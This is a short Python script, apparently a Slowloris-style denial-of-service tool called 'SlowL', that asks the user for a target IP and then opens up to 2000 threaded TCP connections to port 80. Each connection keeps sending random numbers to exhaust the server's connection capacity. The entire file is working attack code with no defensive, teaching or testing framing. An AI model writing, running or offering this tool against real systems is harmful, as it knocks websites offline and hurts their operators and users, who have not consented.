import socket
import random
import threading
import time

class SlowL:
	def __init__(self, ip, port):
		self.ip = socket.gethostbyname(ip)
		self.port = port
		self.open = 0
		while True:
			if self.open < 2000:
				t = threading.Thread(target=self.handler)
				t.daemon = True
				t.start()
				self.open += 1
			print("Open count: " + str(self.open) + " - " + "Active thread count: " + str(threading.active_count()))

	def handler(self):
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		sock.connect((self.ip, self.port))
		while True:
			try:
				sock.send(bytes(str(random.randint(1000000000, 99999999999)), "utf-8"))
				sock.recv(1024)
			except:
				sock.close()
				break
		self.open -= 1

if __name__ == '__main__':
	ips = input("IP NOW: ")
	s = SlowL(ips, 80)
